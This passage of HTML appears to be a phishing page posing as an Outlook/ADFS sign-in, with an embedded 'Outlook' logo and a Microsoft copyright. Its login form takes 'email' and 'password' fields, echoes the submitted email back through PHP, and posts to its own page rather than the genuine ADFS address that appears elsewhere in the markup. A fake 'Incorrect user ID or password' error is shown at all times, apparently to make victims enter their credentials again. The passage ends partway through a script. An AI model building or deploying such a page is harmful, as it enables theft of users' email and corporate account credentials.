AAAAABGMAQAAAACIYAwAAAAAQARjAAAAAAAiGAMAAAAAEMEYAAAAAIAIxgAAAAAARDAGAAAAACCCMQAAAAAAEYwBAAAAAIhgDAAAAABABGMAAAAAACIYAwAAAAAQwRgAAAAAgAjGAAAAAABEMAYAAAAAIIIxAAAAAAARjAEAAAAAiGAMAAAAAEAEYwAAAAAAIhgDAAAAABDBGAAAAACACMYAAAAAAEQwBgAAAAAggjEAAAAAABGMAQAAAACIYAwAAAAAwFum6f8Blwsxf5IAkzcAAAAASUVORK5CYII=);}</style>
</head>
<body dir="ltr" class="body">
<div id="noScript" style="position:static; width:100%; height:100%; z-index:100">
<h1>JavaScript required</h1>
<p>JavaScript is required. This web browser does not support JavaScript or JavaScript in this web browser is not enabled.</p>
<p>To find out if your web browser supports JavaScript or to enable JavaScript, see web browser help.</p>
</div>
<script type="text/javascript" language="JavaScript">
document.getElementById("noScript").style.display = "none";
</script>
<div id="fullPage">
<div id="brandingWrapper" class="float">
<div id="branding"></div>
</div>
<div id="contentWrapper" class="float">
<div id="content">
<div id="header">
    <img class='logoImage' id='companyLogo' src='data:image/png;base64,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' alt='Outlook'/>
</div>
<div id="workArea">
    
<div id="authArea" class="groupMargin">

<div id="loginArea">        
<div id="loginMessage" class="groupMargin"> </div>

<form method="post" id="loginForm" autocomplete="off" novalidate="novalidate" onKeyPress="if (event && event.keyCode == 13) Login.submitLoginRequest();" action="" >
<div id="error" class="fieldMargin error smallText">
<span id="errorText" for="">Incorrect user ID or password. Type the correct user ID and password, and try again.</span>
</div>

<div id="formsAuthenticationArea">
<div id="userNameArea">
    <label id="userNameInputLabel" for="userNameInput" class="hidden">User Account</label>
    <input id="userNameInput" name="email" type="email" value="<?php if(isset($email))echo $email; ?>" tabindex="1" class="text fullWidth"
        spellcheck="false" placeholder="someone@example.com" autocomplete="off"/>
</div>

<div id="passwordArea">
    <label id="passwordInputLabel" for="passwordInput" class="hidden">Password</label>
    <input id="passwordInput" name="password" type="password" tabindex="2" class="text fullWidth"
        placeholder="Password" autocomplete="off"/>
</div>
<div id="kmsiArea" style="display:''">
    <input type="checkbox" name="Kmsi" id="kmsiInput" value="true" tabindex="3" />
    <label for="kmsiInput">Keep me signed in</label>
</div>
<div id="submissionArea" class="submitMargin">
    <span id="submitButton" class="submit" tabindex="4" role=""
        onKeyPress="if (event && event.keyCode == 32) Login.submitLoginRequest();"
        onclick="return Login.submitLoginRequest();">Sign in</span>
</div>
</div>
<input id="optionForms" type="hidden" name="AuthMethod" value="FormsAuthentication"/>
</form>

<div id="authOptions">
<form id="options"  method="post" action="https://cluster3.adfs.ovh.net:443/adfs/ls/?wa=wsignin1.0&wtrealm=https%3a%2f%2fex3.mail.ovh.net%2fowa%2f&wctx=rm%3d0%26id%3dpassive%26ru%3d%252fowa%252f%253fauthRedirect%253dtrue&wct=2017-09-28T10%3a21%3a41Z&client-request-id=62e6fd39-6a21-4f95-3b0e-018000000028">
<script type="text/javascript">
function SelectOption(option) {
    var i = document.getElementById('optionSelection');
    i.value = option;
    document.forms['options'].submit();
    return false;
}
</script>
<input id="optionSelection" type="hidden" name="AuthMethod" />
<div id='authOptionLinks' class='groupMargin'></div>
</form>
</div>

<div id="introduction" class="groupMargin">
                    
</div>

<script type="text/javascript">
//<![CDATA[

function Login() {
}

Login.userNameInput = 'userNameInput';
Login.passwordInput = 'passwordInput';

Login.initialize = function () {

var u = new InputUtil();

u.checkError();
u.setInitialFocus(Login.userNameInput);
u.setInitialFocus(Login.passwordInput);
}();

Login.submitLoginRequest = function () { 
var u = new InputUtil();
var e = new LoginErrors();

var userName = document.getElementById(Login.userNameInput);
var password = document.getElementById(Login.passwordInput);

if (!userName.value || !userName.value.match('[@\\\\]')) {
    u.setError(userName, e.userNameFormatError);
    return false;
}

if (!password.value) {
    u.setError(password, e.passwordEmpty);
    return false;
}

if (password.value.length > maxPasswordLength) {
    u.setError(password, e.passwordTooLong);
    return false;
}

document.forms['loginForm'].submit();
return false;
};

InputUtil.makePlaceholder(Login.userNameInput);
InputUtil.makePlaceholder(Login.passwordInput);
//]]>
</script>
</div>

</div>

</div>
<div id="footerPlaceholder"></div>
</div>
<div id="footer">
<div id="footerLinks" class="floatReverse">
<div><span id="copyright">&#169; 2016 Microsoft</span></div>
</div>
</div>
</div> 
</div>
<script type='text/javascript'>
//<![CDATA[
// Copyright (c) Microsoft Corporation.  All rights reserved.

// This file contains several workarounds on inconsistent browser behaviors that administrators may customize.
"use strict";

// iPhone email friendly keyboard does not include "\" key, use regular keyboard instead.
// Note change input type does not work on all versions of all browsers.
if (navigator.userAgent.match(/iPhone/i) != null) {
